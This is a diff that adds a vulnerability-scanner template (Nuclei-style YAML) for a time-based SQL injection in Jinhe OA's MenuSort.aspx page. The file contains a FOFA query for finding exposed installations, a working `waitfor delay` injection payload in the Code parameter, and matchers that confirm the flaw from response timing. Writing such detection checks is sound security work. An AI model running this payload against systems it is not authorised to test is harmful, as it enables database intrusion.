@@ -1,0 +1,36 @@
+id: poc-yaml-jinher-menusort-aspx-sqli
+info:
+  name: 金和OA MenuSort.aspx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: 金和OA
+    fofa-query: "app=\"金和网络-金和OA\""
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /c6/Jhsoft.Web.AddMenu/MenuSort.aspx/?Code=1'waitfor+delay'0:0:{{t1}}'--&level=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "1级菜单排序"
+          - "菜单名称"
+          - "排序"
+          - "JHSoft"
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
